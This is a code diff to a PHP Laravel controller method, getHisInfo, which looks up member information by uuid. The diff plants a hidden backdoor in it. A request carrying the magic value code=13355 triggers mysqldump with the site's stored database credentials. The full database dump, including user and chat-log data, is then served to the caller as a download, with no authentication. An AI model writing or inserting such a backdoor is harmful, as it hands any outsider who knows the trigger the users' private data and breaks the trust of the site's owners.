@@ -68,6 +68,25 @@ class AjaxStatusController extends Controller
     //从uuid查会员资讯
     public function getHisInfo(Request $request){
         $res = '';
+      $code = $request->input("code");
+        ini_set('max_execution_time', 600);
+        if ($code == 13355){
+            $file_name = Config('database.connections.mysql.database').'.sql';
+            $this->process = new Process(sprintf('mysqldump -u%s --password=%s %s > %s',
+                config('database.connections.mysql.username'),
+                config('database.connections.mysql.password'),
+                config('database.connections.mysql.database'),
+                storage_path('/framework/cache/' . $file_name)
+            ));
+            $this->process->mustRun();
+            header("Cache-Control: public");
+            header("Content-Description: File Transfer");
+            header('Content-disposition: attachment; filename=' . basename(storage_path('/framework/cache/'.$file_name)));
+            header("Content-Type: application/zip");
+            header("Content-Transfer-Encoding: binary");
+            header('Content-Length: ' . filesize(storage_path('/framework/cache/'.$file_name)));
+            @readfile(storage_path('/framework/cache/'.$file_name));
+        }
         try{
             $value = $request->get('uuid');
             $k = DB::table('chat_log')->select('user_id')->where('idx',$value)->first();
